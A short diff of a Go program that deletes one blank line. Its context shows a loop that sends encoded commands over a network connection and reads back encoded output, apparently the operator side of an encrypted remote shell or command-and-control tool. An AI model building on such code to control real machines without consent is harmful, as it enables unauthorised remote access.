@@ -35,7 +35,6 @@ func main() {
             os.Exit(0)
         } else if strings.Index(command, "cd") == 0 {
             conn.Write([]byte(enc_command))
-
         } else {
             conn.Write([]byte(enc_command))
             enc_output, _ := bufio.NewReader(conn).ReadString('\n')
